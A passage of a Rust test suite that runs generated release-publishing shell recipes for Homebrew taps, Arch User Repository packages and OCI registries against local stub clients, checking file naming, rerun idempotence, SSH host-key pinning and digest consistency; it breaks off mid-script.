            fn run_with_host_fingerprint(&self, fingerprint: Option<&str>) -> Outcome {
                let root = self.workspace.root();
                let step = publish_step(root, &self.job, &self.temp);
                let pinned = step
                    .env
                    .get("INTENTIONAL_AUR_HOST_FINGERPRINT")
                    .cloned()
                    .unwrap_or_default();
                let mut command = std::process::Command::new("bash");
                command
                    .arg("-c")
                    .arg(&step.run)
                    .current_dir(root)
                    .env_clear()
                    .env(
                        "PATH",
                        format!(
                            "{}:{}",
                            self.stubs.display(),
                            std::env::var("PATH").unwrap_or_default()
                        ),
                    )
                    .env("HOME", root)
                    .env("RUNNER_TEMP", &self.temp)
                    .env("FAKE_REMOTES", &self.remotes)
                    // The stub reports whatever fingerprint the scenario says
                    // the host answered with, so the recipe's comparison against
                    // its own pinned value is what decides the outcome.
                    .env("FAKE_HOST_FINGERPRINT", fingerprint.unwrap_or(&pinned));
                for (name, value) in &step.env {
                    command.env(name, value);
                }
                let output = command.output().expect("the promotion body runs");
                Outcome {
                    status: output.status,
                    stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
                }
            }

            /// Files the destination repository carries, by repository path.
            fn destination_files(&self, name: &str) -> BTreeMap<String, String> {
                let checkout = self.workspace.root().join(format!("read-{name}"));
                let _ = std::fs::remove_dir_all(&checkout);
                let status = std::process::Command::new("git")
                    .arg("clone")
                    .arg("--quiet")
                    .arg(self.remotes.join(name))
                    .arg(&checkout)
                    .status()
                    .expect("git clone runs");
                assert!(status.success(), "the destination repository is readable");
                let mut files = BTreeMap::new();
                collect(&checkout, &checkout, &mut files);
                files
            }

            /// Commits the destination repository carries.
            fn destination_commits(&self, name: &str) -> usize {
                let output = std::process::Command::new("git")
                    .arg("-C")
                    .arg(self.remotes.join(name))
                    .args(["rev-list", "--count", "--all"])
                    .output()
                    .expect("git rev-list runs");
                String::from_utf8_lossy(&output.stdout)
                    .trim()
                    .parse()
                    .unwrap_or(0)
            }

            /// Whether the destination repository exists at all.
            fn destination_exists(&self, name: &str) -> bool {
                self.remotes.join(name).is_dir()
            }
        }

        /// Every tracked file beneath one checkout, by repository-relative path.
        fn collect(root: &Path, directory: &Path, files: &mut BTreeMap<String, String>) {
            for entry in std::fs::read_dir(directory).expect("checkout readable") {
                let path = entry.expect("checkout entry").path();
                if path.file_name().is_some_and(|name| name == ".git") {
                    continue;
                }
                if path.is_dir() {
                    collect(root, &path, files);
                } else {
                    files.insert(
                        path.strip_prefix(root)
                            .expect("relative")
                            .display()
                            .to_string(),
                        std::fs::read_to_string(&path).expect("file contents"),
                    );
                }
            }
        }

        struct PublishStep {
            run: String,
            env: BTreeMap<String, String>,
        }

        /// Read the derived publish step rather than restating it.
        ///
        /// The environment comes from the step's own `env:` mapping, so a value
        /// the derivation stopped routing, or started spelling differently, is
        /// absent here rather than supplied by the test.
        fn publish_step(root: &Path, job: &str, temp: &Path) -> PublishStep {
            let document: Value = serde_yaml::from_str(&workflow(root, WorkflowRole::Publish))
                .expect("workflow parses");
            let steps = document["jobs"][job]["steps"]
                .as_sequence()
                .unwrap_or_else(|| panic!("{job} has steps"));
            let step = steps
                .iter()
                .find(|step| {
                    step["name"]
                        .as_str()
                        .is_some_and(|name| name.starts_with("Publish "))
                })
                .unwrap_or_else(|| panic!("{job} has a publish step"));
            let env = step["env"]
                .as_mapping()
                .expect("the publish step routes its values through env")
                .iter()
                .map(|(name, value)| {
                    (
                        name.as_str().expect("env name").to_owned(),
                        expression(value.as_str().expect("env value"), temp),
                    )
                })
                .collect();
            PublishStep {
                run: step["run"].as_str().expect("publish body").to_owned(),
                env,
            }
        }

        /// Stand in for the workflow expressions a runner would have resolved.
        fn expression(value: &str, temp: &Path) -> String {
            if value.contains("steps.") && value.contains("token") {
                return "a-short-lived-installation-token".to_owned();
            }
            if value.contains("secrets.") {
                return "a-repository-supplied-secret".to_owned();
            }
            value
                .replace("${{ runner.temp }}", &temp.display().to_string())
                .replace("${{ github.ref_name }}", "component/staged@1.0.0")
        }

        fn write_stubs(directory: &Path) {
            let git = which("git");
            for (name, body) in [
                ("git", GIT_STUB.replace("@GIT@", &git)),
                ("ssh-keyscan", SSH_KEYSCAN_STUB.to_owned()),
                ("ssh-keygen", SSH_KEYGEN_STUB.to_owned()),
            ] {
                let path = directory.join(name);
                std::fs::write(&path, body).expect("stub written");
                let status = std::process::Command::new("chmod")
                    .arg("+x")
                    .arg(&path)
                    .status()
                    .expect("chmod runs");
                assert!(status.success(), "{name} is executable");
            }
        }

        /// Absolute path of one command, so a stub can delegate to the real one.
        fn which(command: &str) -> String {
            let output = std::process::Command::new("sh")
                .arg("-c")
                .arg(format!("command -v {command}"))
                .output()
                .expect("command lookup runs");
            String::from_utf8_lossy(&output.stdout).trim().to_owned()
        }

        /// Rewrite a remote destination to a local repository and run real git.
        ///
        /// Only the URL is stubbed. Everything the recipe depends on -- that a
        /// clone of an unregistered package fails, that `status --porcelain` is
        /// empty when nothing changed, that a push lands what was committed --
        /// is the real client's behaviour rather than a stub's imitation.
        const GIT_STUB: &str = r#"#!/usr/bin/env bash
set -euo pipefail
arguments=()
for argument in "$@"; do
  case "${argument}" in
    https://*@github.com/*|ssh://aur@aur.archlinux.org/*)
      name="${argument##*/}"
      resolved="${FAKE_REMOTES}/${name%.git}"
      # The Arch User Repository registers a package on its initial push, so a
      # destination the recipe adds as a remote is one a push would create. A
      # clone still fails against an absent package, which is the branch the
      # recipe has to handle.
      if [[ " $* " == *" remote "* ]] && [ ! -d "${resolved}" ]; then
        @GIT@ init --quiet --bare --initial-branch=master "${resolved}"
      fi
      arguments+=("${resolved}")
      ;;
    *) arguments+=("${argument}") ;;
  esac
done
exec @GIT@ "${arguments[@]}"
"#;

        const SSH_KEYSCAN_STUB: &str = r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s ssh-ed25519 %s\n' "${*: -1}" "the key the host answered with"
"#;

        const SSH_KEYGEN_STUB: &str = r#"#!/usr/bin/env bash
set -euo pipefail
printf '256 %s host (ED25519)\n' "${FAKE_HOST_FINGERPRINT}"
"#;

        // The packager writes each formula under the directory its own `brews`
        // entry declares and publishes it at that same path. Choosing one file
        // out of the tree, or choosing the directory here, both publish a tap
        // the native configuration did not describe.
        #[test]
        fn promotes_every_formula_at_the_directory_its_native_entry_declares() {
            let recipe = Recipe::new("recipe-homebrew-promote", HOMEBREW_JOB)
                .with_destination("homebrew-tap")
                .with_distribution();
            recipe.run().expect_success();
            assert_eq!(
                recipe
                    .destination_files("homebrew-tap")
                    .keys()
                    .cloned()
                    .collect::<Vec<_>>(),
                vec![
                    "Formula/example-tool.rb".to_owned(),
                    "HomebrewFormula/example-tool.rb".to_owned(),
                ],
                "both declared taps receive their formula, and the cask is not one"
            );
        }

        // Destination readback decides whether a publication is present, so a
        // rerun that finds the tap already carrying this release has nothing to
        // do and must not fail for having nothing to do.
        #[test]
        fn a_homebrew_rerun_that_changes_nothing_commits_nothing() {
            let recipe = Recipe::new("recipe-homebrew-rerun", HOMEBREW_JOB)
                .with_destination("homebrew-tap")
                .with_distribution();
            recipe.run().expect_success();
            let first = recipe.destination_commits("homebrew-tap");
            recipe.run().expect_success();
            assert_eq!(
                recipe.destination_commits("homebrew-tap"),
                first,
                "an unchanged rerun succeeds without a second commit"
            );
        }

        #[test]
        fn a_homebrew_promotion_with_no_generated_formula_fails() {
            let recipe = Recipe::new("recipe-homebrew-absent", HOMEBREW_JOB)
                .with_destination("homebrew-tap");
            assert!(
                !recipe.run().succeeded(),
                "a build that produced no formula cannot be promoted"
            );
            assert!(recipe.destination_files("homebrew-tap").is_empty());
        }

        // The packager writes `aur/<package>.pkgbuild` and `.srcinfo`; the Arch
        // User Repository requires `PKGBUILD` and `.SRCINFO`. Both halves have
        // to be right, and this is the pair the previous recipe got wrong.
        #[test]
        fn installs_the_arch_sources_under_the_names_the_repository_requires() {
            let recipe = Recipe::new("recipe-aur-promote", AUR_JOB)
                .with_destination(AUR_PACKAGE)
                .with_distribution();
            recipe.run().expect_success();
            let files = recipe.destination_files(AUR_PACKAGE);
            assert_eq!(
                files.keys().cloned().collect::<Vec<_>>(),
                vec![".SRCINFO".to_owned(), "PKGBUILD".to_owned()],
                "the destination receives exactly the two files makepkg reads"
            );
            assert_eq!(files["PKGBUILD"], "pkgname=example-tool-bin\n");
            assert_eq!(files[".SRCINFO"], "pkgbase = example-tool-bin\n");
        }

        // A release unit with a second `aur` entry writes its files into the
        // same directory. Promoting them would publish another package's
        // sources under this package's name.
        #[test]
        fn leaves_a_sibling_arch_package_out_of_this_publication() {
            let recipe = Recipe::new("recipe-aur-sibling", AUR_JOB)
                .with_destination(AUR_PACKAGE)
                .with_distribution();
            recipe.run().expect_success();
            let files = recipe.destination_files(AUR_PACKAGE);
            assert!(
                !files
                    .values()
                    .any(|contents| contents.contains("example-other-bin")),
                "the sibling package's sources stayed out: {files:?}"
            );
        }

        // The Arch User Repository registers a package on its initial push, and
        // a clone of one it does not carry is an error rather than an empty
        // repository. A recipe that could only update would never publish a new
        // package at all.
        #[test]
        fn creates_an_arch_package_the_repository_does_not_yet_carry() {
            let recipe = Recipe::new("recipe-aur-first", AUR_JOB).with_distribution();
            assert!(!recipe.destination_exists(AUR_PACKAGE));
            recipe.run().expect_success();
            assert_eq!(
                recipe
                    .destination_files(AUR_PACKAGE)
                    .keys()
                    .cloned()
                    .collect::<Vec<_>>(),
                vec![".SRCINFO".to_owned(), "PKGBUILD".to_owned()]
            );
        }

        #[test]
        fn an_arch_rerun_that_changes_nothing_commits_nothing() {
            let recipe = Recipe::new("recipe-aur-rerun", AUR_JOB)
                .with_destination(AUR_PACKAGE)
                .with_distribution();
            recipe.run().expect_success();
            let first = recipe.destination_commits(AUR_PACKAGE);
            recipe.run().expect_success();
            assert_eq!(recipe.destination_commits(AUR_PACKAGE), first);
        }

        // The recipe scopes its SSH authority to one destination. Trusting the
        // host on first use would hand that authority to whatever answered.
        #[test]
        fn refuses_an_arch_host_whose_key_does_not_match_the_pin() {
            let recipe = Recipe::new("recipe-aur-host", AUR_JOB)
                .with_destination(AUR_PACKAGE)
                .with_distribution();
            let outcome = recipe.run_with_host_fingerprint(Some("SHA256:AnImpostorAnsweredHere"));
            assert!(
                !outcome.succeeded(),
                "an unpinned host key stops the promotion"
            );
            assert!(
                recipe.destination_files(AUR_PACKAGE).is_empty(),
                "nothing reached the destination"
            );
        }

        // An unnamed entry takes the project name and the same suffix, so it
        // names the same destination. Dropping it while reading would make the
        // sibling entry index 0 and promote this package's sources under the
        // sibling's name.
        #[test]
        fn resolves_an_unnamed_arch_entry_to_this_publications_package() {
            let recipe = Recipe::declaring("recipe-aur-unnamed", AUR_JOB, UNNAMED_ARCH_CONFIG)
                .with_destination(AUR_PACKAGE)
                .with_distribution();
            recipe.run().expect_success();
            let files = recipe.destination_files(AUR_PACKAGE);
            assert_eq!(files["PKGBUILD"], "pkgname=example-tool-bin\n");
            assert!(
                !recipe.destination_exists("example-other-bin"),
                "the sibling package was never reached"
            );
        }

        #[test]
        fn an_arch_promotion_with_no_generated_sources_fails() {
            let recipe = Recipe::new("recipe-aur-absent", AUR_JOB).with_destination(AUR_PACKAGE);
            assert!(!recipe.run().succeeded());
            assert!(recipe.destination_files(AUR_PACKAGE).is_empty());
        }
    }
    /// The maintained OCI recipes, executed against stubbed registry clients.
    ///
    /// These bodies are shell, and the properties this task is accountable for --
    /// one digest at every destination, aliases that only ever move forward, a
    /// retrieval that used no credential -- are properties of what the shell does,
    /// not of what it says. Asserting the emitted text would restate the recipe
    /// rather than check it, so each scenario runs the derived body with `crane`,
    /// `cosign` and `docker` replaced by stubs over a directory that stands in for
    /// a registry, and reads the observation the recipe wrote.
    mod oci_recipes {
        use super::*;
        use crate::executor::fixture::Workspace;
        use crate::publication::observation::{ObservationState, PublicationObservation};
        use std::path::PathBuf;

        /// Digest of the index the sealed layout carries, over its own bytes.
        ///
        /// The fixture names every manifest by the hash of the manifest, the way
        /// a registry does, so `published` is derived from the bytes the body
        /// pushed rather than asserted by the harness.
        fn index_digest(annotated_version: &str, attested: bool) -> String {
            manifest_digest(&index_manifest(annotated_version, attested))
        }

        fn manifest_digest(manifest: &str) -> String {
            format!("sha256:{:x}", Sha256::digest(manifest.as_bytes()))
        }

        fn index_manifest(annotated_version: &str, attested: bool) -> String {
            let attestation = if attested {
                format!(
                    r#",{{"digest":"{}","annotations":{{"vnd.docker.reference.type":"attestation-manifest"}}}}"#,
                    manifest_digest(ATTESTATION_MANIFEST)
                )
            } else {
                String::new()
            };
            format!(
                r#"{{"schemaVersion":2,"annotations":{{"org.opencontainers.image.version":"{annotated_version}","org.opencontainers.image.title":"example-image"}},"manifests":[{{"digest":"sha256:aaaa","platform":{{"os":"linux","architecture":"amd64"}}}}{attestation}]}}"#
            )
        }

        /// The attestation manifest a Buildx build attaches to its index.
        const ATTESTATION_MANIFEST: &str = concat!(
            r#"{"schemaVersion":2,"layers":[{"digest":"sha256:4444444444444444444444444444444444444444444444444444444444444444","annotations":{"in-toto.io/predicate-type":"https://spdx.dev/Document"}},"#,
            r#"{"digest":"sha256:5555555555555555555555555555555555555555555555555555555555555555","annotations":{"in-toto.io/predicate-type":"https://slsa.dev/provenance/v0.2"}}]}"#
        );
        /// Digest the built-subject document records over the built bytes.
        const SUBJECT_DIGEST: &str =
            "sha256:2222222222222222222222222222222222222222222222222222222222222222";
        const SBOM_DIGEST: &str =
            "sha256:4444444444444444444444444444444444444444444444444444444444444444";
        const PROVENANCE_DIGEST: &str =
            "sha256:5555555555555555555555555555555555555555555555555555555555555555";
        /// A digest a destination might already hold under the released version.
        const FOREIGN_DIGEST: &str =
            "sha256:6666666666666666666666666666666666666666666666666666666666666666";

        /// One run of one derived publisher body against a stubbed registry.
        struct Recipe {
            workspace: Workspace,
            registry: PathBuf,
            stubs: PathBuf,
            job: String,
            feature: bool,
        }

        /// What running a recipe body produced.
        struct Outcome {
            index_digest: String,
            status: std::process::ExitStatus,
            stderr: String,
            observation: Option<PublicationObservation>,
            registry: PathBuf,
            verified: BTreeMap<String, String>,
        }

        impl Outcome {
            fn observation(&self) -> &PublicationObservation {
                self.observation
                    .as_ref()
                    .unwrap_or_else(|| panic!("the recipe wrote an observation: {}", self.stderr))
            }

            /// What this job's verification step was told it is verifying.
            ///
            /// Read from the verifier's inputs rather than from the recipe's
            /// own environment, so the comparison does not move with the thing
            /// it is checking: a body that wrote a literal, and an `env:` row
            /// that stopped carrying the routed value, both leave this side of
            /// the assertion where it was.
            fn verified(&self, input: &str) -> &str {
                self.verified
                    .get(input)
                    .unwrap_or_else(|| panic!("the verification step is given {input}"))
            }

            /// Release tags one repository carries, and the digest each resolves.
            ///
            /// A keyless signature is itself published as a tag derived from the
            /// digest it signs, so it is excluded here: it is evidence about a
            /// subject rather than a version or alias a consumer resolves.
            fn tags(&self, repository: &str) -> BTreeMap<String, String> {
                let directory = self
                    .registry
                    .join("tags")
                    .join(repository.replace('/', "_"));
                let Ok(entries) = std::fs::read_dir(&directory) else {
                    return BTreeMap::new();
                };
                entries
                    .map(|entry| {
                        let path = entry.expect("registry entry").path();
                        (
                            path.file_name()
                                .expect("tag")
                                .to_string_lossy()
                                .into_owned(),
                            std::fs::read_to_string(&path).expect("tag digest"),
                        )
                    })
                    .filter(|(tag, _)| !tag.ends_with(".sig"))
                    .collect()
            }

            /// Every credential store a retrieval was performed with.
            fn retrieval_stores(&self) -> Vec<String> {
                std::fs::read_to_string(self.registry.join("docker-config.log"))
                    .unwrap_or_default()
                    .lines()
                    .map(str::to_owned)
                    .collect()
            }
        }

        impl Recipe {
            /// Derive the publish workflow for a two-destination OCI release unit.
            fn new(label: &str, job: &str) -> Self {
                Self::over(two_destination_workspace(label), job, false)
            }

            /// Derive it for a Dev Container Feature published to GHCR.
            fn feature(label: &str) -> Self {
                Self::over(feature_workspace(label), GHCR_JOB, true)
            }

            fn over(workspace: Workspace, job: &str, feature: bool) -> Self {
                converge(workspace.root(), WorkflowRole::Publish);
                let registry = workspace.root().join("registry");
                let stubs = workspace.root().join("stubs");
                std::fs::create_dir_all(registry.join("blobs")).expect("registry directory");
                std::fs::create_dir_all(&stubs).expect("stub directory");
                write_stubs(&stubs);
                Self {
                    workspace,
                    registry,
                    stubs,
                    job: job.to_owned(),
                    feature,
                }
            }

            /// Seed one repository with the versions a destination already carries.
            fn seeded(self, repository: &str, tags: &[(&str, &str)]) -> Self {
                let directory = self
                    .registry
                    .join("tags")
                    .join(repository.replace('/', "_"));
                std::fs::create_dir_all(&directory).expect("seed directory");
                for (tag, digest) in tags {
                    std::fs::write(directory.join(tag), digest).expect("seed tag");
                    // A destination that resolves a digest also serves the
                    // manifest behind it; a recipe that reads what is already
                    // there would otherwise be reading nothing.
                    let foreign = if self.feature {
                        r#"{"schemaVersion":2,"layers":[{"digest":"sha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"}]}"#
                    } else {
                        r#"{"schemaVersion":2,"manifests":[{"digest":"sha256:dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"}]}"#
                    };
                    std::fs::write(self.registry.join("blobs").join(digest), foreign)
                        .expect("seed manifest");
                }
                self
            }

            /// Run the derived publisher body for one released version.
            fn run(&self, version: &str) -> Outcome {
                self.run_with_annotation(version, version)
            }

            /// Run it with an index annotating a version of its own.
            fn run_with_annotation(&self, version: &str, annotated: &str) -> Outcome {
                self.execute(version, annotated, "", true)
            }

            /// Run it where one client misbehaved in a named way.
            fn run_with_drift(&self, version: &str, drift: &str) -> Outcome {
                self.execute(version, version, drift, true)
            }

            /// Run it where the packager attached no attestation at all.
            fn run_unattested(&self, version: &str) -> Outcome {
                self.execute(version, version, "", false)
            }

            fn execute(
                &self,
                version: &str,
                annotated: &str,
                drift: &str,
                attested: bool,
            ) -> Outcome {
                let root = self.workspace.root();
                let temp = root.join("runner-temp");
                let subject = temp.join("intentional_subject");
                let bytes = subject.join("bytes");
                std::fs::create_dir_all(&bytes).expect("subject directory");
                if self.feature {
                    std::fs::write(
                        bytes.join(format!("devcontainer-feature-{FEATURE_ID}.tgz")),
                        "the packaged Feature the build job sealed",
                    )
                    .expect("packaged feature");
                } else {
                    write_layout(&bytes, annotated, attested);
                }

                let step = publish_step(root, &self.job, &temp, version);
                let verified = step.verified.clone();
                let mut command = std::process::Command::new("bash");
                command
                    .arg("-c")
                    .arg(step.run)
                    .current_dir(root.join("component"))
                    .env_clear()
                    .env(
                        "PATH",
                        format!(
                            "{}:{}",
                            self.stubs.display(),
                            std::env::var("PATH").unwrap_or_default()
                        ),
                    )
                    .env("HOME", root)
                    .env("RUNNER_TEMP", &temp)
                    .env("FAKE_REGISTRY", &self.registry)
                    .env("FAKE_DRIFT", drift);
                for (name, value) in step.env {
                    command.env(name, value);
                }
                let output = command.output().expect("the recipe body runs");
                let observation = temp
                    .join("intentional_observation")
                    .join(format!(
                        "{}.yml",
                        self.job.trim_start_matches("intentional_publish_")
                    ))
                    .canonicalize()
                    .ok()
                    .map(|path| {
                        PublicationObservation::load(&path).unwrap_or_else(|error| {
                            panic!("the recipe wrote a loadable observation: {error}")
                        })
                    });
                Outcome {
                    index_digest: index_digest(annotated, attested),
                    status: output.status,
                    stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
                    observation,
                    registry: self.registry.clone(),
                    verified,
                }
            }
        }

        /// One publisher step's shell body and the environment it is given.
        struct PublishStep {
            run: String,
            env: BTreeMap<String, String>,
            /// Inputs the verification step of the same job is given.
            ///
            /// The publication this job performs is named twice by the
            /// derivation, once into the recipe's environment and once into
            /// the verifier's inputs. Reading the second is what lets the
            /// observation's own binding be checked without comparing the
            /// recipe against the thing that fed it.
            verified: BTreeMap<String, String>,
        }

        /// Read the derived publisher step rather than restating it.
        ///
        /// The environment is read from the step's own `env:` mapping, so a value
        /// the derivation stopped routing -- or started spelling differently -- is
        /// absent here rather than supplied by the test.
        fn publish_step(root: &Path, job: &str, temp: &Path, version: &str) -> PublishStep {
            let document: Value = serde_yaml::from_str(&workflow(root, WorkflowRole::Publish))
                .expect("workflow parses");
            let steps = document["jobs"][job]["steps"]
                .as_sequence()
                .unwrap_or_else(|| panic!("{job} has steps"));
            let step = steps
                .iter()
                .find(|step| {
                    step["name"]
                        .as_str()
                        .is_some_and(|name| name.starts_with("Publish "))
                })
                .unwrap_or_else(|| panic!("{job} has a publish step"));
            let env = step["env"]
                .as_mapping()
                .expect("the publish step routes its values through env")
                .iter()
                .map(|(name, value)| {
                    (
                        name.as_str().expect("env name").to_owned(),
                        expression(value.as_str().expect("env value"), temp, version),
                    )
                })
                .collect();
            let verify = steps
                .iter()
                .find(|step| {
                    step["uses"]
                        .as_str()
                        .is_some_and(|uses| uses.contains("/verify-publication@"))
                })
                .unwrap_or_else(|| panic!("{job} verifies its own publication"));
            let verified = verify["with"]
                .as_mapping()
                .expect("the verification step is given inputs")
                .iter()
                .map(|(name, value)| {
                    (
                        name.as_str().expect("input name").to_owned(),
                        expression(value.as_str().expect("input value"), temp, version),
                    )
                })
                .collect();
            PublishStep {
                run: step["run"].as_str().expect("publish body").to_owned(),
                env,
                verified,
            }
        }

        /// Stand in for the workflow expressions a runner would have resolved.
        ///
        /// The sealed version and digest are the build job's outputs, so they
        /// are resolved as that job's outputs rather than supplied to the body
        /// directly: a recipe that stopped reading them from the seal reads
        /// nothing here.
        fn expression(value: &str, temp: &Path, version: &str) -> String {
            if value.contains(".outputs.version") {
                return version.to_owned();
            }
            if value.contains(".outputs.digest") {
                return SUBJECT_DIGEST.to_owned();
            }
            value
                .replace("${{ runner.temp }}", &temp.display().to_string())
                .replace("${{ github.repository_owner }}", "example-owner")
                .replace(
                    "${{ github.repository }}",
                    "example-owner/example-repository",
                )
                .replace("${{ github.actor }}", "example-actor")
                .replace("${{ vars.DOCKERHUB_USERNAME }}", "example-account")
                .replace("${{ secrets.DOCKERHUB_TOKEN }}", "example-token")
                .replace("${{ secrets.GITHUB_TOKEN }}", "example-github-token")
        }

        /// The one release unit this fixture's configuration declares.
        ///
        /// Read from the workspace rather than restated here, so the anchor is
        /// the text an author wrote rather than a second copy of it.
        fn configured_release_unit(root: &Path) -> String {
            let configuration: Value = serde_yaml::from_str(
                &std::fs::read_to_string(root.join(".intentional/config.yml"))
                    .expect("the workspace is configured"),
            )
            .expect("the configuration parses");
            let units = configuration["release-units"]
                .as_mapping()
                .expect("release units")
                .keys()
                .filter_map(Value::as_str)
                .map(str::to_owned)
                .collect::<Vec<_>>();
            let [unit] = units.as_slice() else {
                panic!("this fixture declares one release unit: {units:?}");
            };
            unit.clone()
        }

        /// The sealed OCI layout a build job would have produced.
        fn write_layout(bytes: &Path, annotated_version: &str, attested: bool) {
            let layout = bytes.join("layout");
            let blobs = layout.join("blobs/sha256");
            std::fs::create_dir_all(&blobs).expect("layout directory");
            let index = index_manifest(annotated_version, attested);
            let index_digest = manifest_digest(&index);
            std::fs::write(
                layout.join("index.json"),
                format!(r#"{{"schemaVersion":2,"manifests":[{{"digest":"{index_digest}"}}]}}"#),
            )
            .expect("layout index");
            std::fs::write(
                blobs.join(index_digest.trim_start_matches("sha256:")),
                &index,
            )
            .expect("index manifest");
            std::fs::write(
                blobs.join(manifest_digest(ATTESTATION_MANIFEST).trim_start_matches("sha256:")),
                ATTESTATION_MANIFEST,
            )
            .expect("attestation manifest");
            let status = std::process::Command::new("tar")
                .arg("-cf")
                .arg(bytes.join("subject.oci.tar"))
                .arg("-C")
                .arg(&layout)
                .arg(".")
                .status()
                .expect("tar runs");
            assert!(status.success(), "the sealed layout archives");
            std::fs::remove_dir_all(&layout).expect("only the archive travels");
        }

        /// Registry, signing and packager clients a runner would have installed.
        fn write_stubs(directory: &Path) {
            for (name, body) in [
                ("crane", CRANE_STUB),
                ("cosign", COSIGN_STUB),
                ("docker", DOCKER_STUB),
                ("npm", NPM_STUB),
                ("devcontainer", DEV_CONTAINER_STUB),
            ] {
                let path = directory.join(name);
                std::fs::write(&path, body).expect("stub written");
                let status = std::process::Command::new("chmod")
                    .arg("+x")
                    .arg(&path)
                    .status()
                    .expect("chmod runs");
                assert!(status.success(), "{name} is executable");
            }
        }

        const CRANE_STUB: &str = r#"#!/usr/bin/env bash
    set -euo pipefail
    registry="${FAKE_REGISTRY}"
    mkdir -p "${registry}/tags" "${registry}/blobs"
    slug() { printf '%s' "${1}" | tr '/' '_'; }
    resolve() {
      case "$1" in
        *@sha256:*)
          test -f "${registry}/blobs/${1#*@}"
          printf '%s' "${1#*@}"
          ;;
        *) cat "${registry}/tags/$(slug "${1%:*}")/${1##*:}" ;;
      esac
    }
    case "${1}" in
      auth) cat > /dev/null; printf '%s\n' "$*" >> "${registry}/auth.log" ;;
      version) printf '0.20.2\n' ;;
      ls)
        directory="${registry}/tags/$(slug "${2}")"
        if [ -d "${directory}" ]; then ls "${directory}"; fi
        ;;
      digest)
        printf '%s\n' "${DOCKER_CONFIG:-inherited}" >> "${registry}/docker-config.log"
        if [ "${FAKE_DRIFT:-}" = "private" ] && [ -n "${DOCKER_CONFIG:-}" ]; then
          exit 1
        fi
        if [ "${FAKE_DRIFT:-}" = "public" ] && [ -n "${DOCKER_CONFIG:-}" ]; then
          # A different subject the destination genuinely serves, so every
          # content-addressed check downstream agrees with itself and only the
          # comparison with the published digest can notice.
          alternate='{"schemaVersion":2,"manifests":[{"digest":"sha256:aaaa"}]}'
          alternate_digest="sha256:$(printf '%s' "${alternate}" | sha256sum | cut -d ' ' -f 1)"
          printf '%s' "${alternate}" > "${registry}/blobs/${alternate_digest}"
          printf '%s\n' "${alternate_digest}"
          exit 0
        fi
        resolve "${2}"
        printf '\n'
        ;;
      manifest) cat "${registry}/blobs/$(resolve "${2}")" ;;
      tag)
        directory="${registry}/tags/$(slug "${2%:*}")"
        mkdir -p "${directory}"
        if [ "${FAKE_DRIFT:-}" = "alias" ]; then
          printf '%s' "sha256:6666666666666666666666666666666666666666666666666666666666666666" > "${directory}/${3}"
        else
          resolve "${2}" > "${directory}/${3}"
        fi
        ;;
      push)
        shift
        layout=""; reference=""
        while [ $# -gt 0 ]; do
          case "${1}" in
            --index) ;;
            *) if [ -z "${layout}" ]; then layout="${1}"; else reference="${1}"; fi ;;
          esac
          shift
        done
        stored=""
        for blob in "${layout}"/blobs/sha256/*; do
          hashed="sha256:$(sha256sum < "${blob}" | cut -d ' ' -f 1)"
          cp "${blob}" "${registry}/blobs/${hashed}"
          if [ "sha256:$(basename "${blob}")" = "$(jq -r '.manifests[0].digest' \
            "${layout}/index.json")" ]; then
            stored="${hashed}"
          fi
        done
        test -n "${stored}"
        directory="${registry}/tags/$(slug "${reference%:*}")"
        mkdir -p "${directory}"
        if [ "${FAKE_DRIFT:-}" = "content" ] || [ "${FAKE_DRIFT:-}" = "title" ]; then
          if [ "${FAKE_DRIFT:-}" = "content" ]; then
            filter='.manifests[0].digest = "sha256:eeee"'
          else
            filter='.annotations["org.opencontainers.image.title"] = "other-image"'
          fi
          rewritten="$(jq -c "${filter}" "${registry}/blobs/${stored}")"
          rewritten_digest="sha256:$(printf '%s' "${rewritten}" | sha256sum | cut -d ' ' -f 1)"
          printf '%s' "${rewritten}" > "${registry}/blobs/${rewritten_digest}"
          printf '%s' "${rewritten_digest}" > "${directory}/${reference##*:}"
        elif [ "${FAKE_DRIFT:-}" = "push" ]; then
          cp "${registry}/blobs/${stored}" \
            "${registry}/blobs/sha256:6666666666666666666666666666666666666666666666666666666666666666"
          printf '%s' "sha256:6666666666666666666666666666666666666666666666666666666666666666" > "${directory}/${reference##*:}"
        else
          printf '%s' "${stored}" > "${directory}/${reference##*:}"
        fi
        ;;
      *) printf 'unsupported crane invocation: %s\n' "$*" >&2; exit 2 ;;
    esac
    "#;

        const COSIGN_STUB: &str = r#"#!/usr/bin/env bash
    set -euo pipefail
    registry="${FAKE_REGISTRY}"
    slug() { printf '%s' "${1}" | tr '/' '_'; }
    case "${1}" in
      sign)
        reference="${3}"
        repository="${reference%@*}"
        directory="${registry}/tags/$(slug "${repository}")"
        mkdir -p "${directory}"
        printf 'sha256:7777777777777777777777777777777777777777777777777777777777777777' \
          > "${directory}/sha256-${reference#*@sha256:}.sig"
        printf '%s\n' "${reference}" >> "${registry}/signed.log"
        ;;
      triangulate)
        reference="${2}"
        printf '%s:sha256-%s.sig\n' "${reference%@*}" "${reference#*@sha256:}"
        ;;
      *) printf 'unsupported cosign invocation: %s\n' "$*" >&2; exit 2 ;;
    esac
    "#;

        const DOCKER_STUB: &str = r#"#!/usr/bin/env bash
    set -euo pipefail
    printf 'github.com/docker/buildx v0.17.1\n'
    "#;

        const NPM_STUB: &str = r#"#!/usr/bin/env bash
set -euo pipefail
"#;

        /// The Dev Container CLI, which repackages the source and tags it itself.
        const DEV_CONTAINER_STUB: &str = r#"#!/usr/bin/env bash
set -euo pipefail
registry="${FAKE_REGISTRY}"
slug() { printf '%s' "${1}" | tr '/' '_'; }
version="${INTENTIONAL_VERSION}"
repository="${INTENTIONAL_REGISTRY}/${INTENTIONAL_DESTINATION}"
package="${INTENTIONAL_SUBJECT}/devcontainer-feature-${INTENTIONAL_SUBJECT_IDENTITY}.tgz"
if [ "${FAKE_DRIFT:-}" = "repackage" ]; then
  layer="sha256:9999999999999999999999999999999999999999999999999999999999999999"
else
  layer="sha256:$(sha256sum "${package}" | cut -d ' ' -f 1)"
fi
manifest="$(printf '{"schemaVersion":2,"layers":[{"digest":"%s"}]}' "${layer}")"
digest="sha256:$(printf '%s' "${manifest}" | sha256sum | cut -d ' ' -f 1)"
mkdir -p "${registry}/blobs"
printf '%s' "${manifest}" > "${registry}/blobs/${digest}"
directory="${registry}/tags/$(slug "${repository}")"
mkdir -p "${directory}"
tags="${version} ${version%.*}"
case "${version}" in
